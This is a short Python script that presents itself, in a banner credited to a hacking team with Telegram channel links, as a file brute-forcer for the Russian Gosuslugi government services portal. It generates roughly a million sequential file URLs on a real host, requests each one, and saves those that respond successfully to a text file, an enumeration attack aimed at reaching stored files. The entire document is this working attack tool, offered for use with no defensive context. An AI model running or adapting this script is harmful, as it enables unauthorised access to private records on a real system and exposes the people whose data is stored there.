import urllib.request
from urllib.error import URLError, HTTPError
print("********************************************************************")
print("*//////////////////////////////////////////////////////////////////*")
print("*  **************************************************************  *")
print("*  *////////////////////////////////////////////////////////////*  *")
print("*  *//   [Gosuslugi.ru] Files Brute by THack3forU Team        //*  *")
print("*  *////////////////////////////////////////////////////////////*  *")
print("*  *//                       Chanels:                         //*  *")
print("*  *//               http://t.me/UkraineHack                  //*  *")
print("*  *//              http://t.me/Ukraine_Matrix                //*  *")
print("*  *////////////////////////////////////////////////////////////*  *")
print("*  **************************************************************  *")
print("*//////////////////////////////////////////////////////////////////*")
print("********************************************************************")
a=1
s=[]
code=0
b=range(1, 999999)
for a in b:
   if a <= 9:
      s.append("".join(("http://smev.gosuslugi.ru/portal/api/files/get/00000",a.__str__())))
   elif a <= 99:
      s.append("".join(("http://smev.gosuslugi.ru/portal/api/files/get/0000",a.__str__())))
   elif a <= 999:
      s.append("".join(("http://smev.gosuslugi.ru/portal/api/files/get/000",a.__str__())))
   elif a <= 9999:
      s.append("".join(("http://smev.gosuslugi.ru/portal/api/files/get/00",a.__str__())))
   elif a <= 99999:
      s.append("".join(("http://smev.gosuslugi.ru/portal/api/files/get/0",a.__str__())))
   elif a <= 999999:
      s.append("".join(("http://smev.gosuslugi.ru/portal/api/files/get/",a.__str__())))
for i in range(len(s)):
   try:
      sitecode=urllib.request.urlopen(s[i]).getcode()
      if sitecode == 200:
         print(s[i],"Nice Url!")
         f = open('good.txt', 'a')
         f.write(s[i] + '\n')
         f.close()
   except urllib.error.HTTPError as e:
      if e.code == 500:
         print(s[i],"Invalid Url!")
      else:
         print(s[i],"Error:",e.code)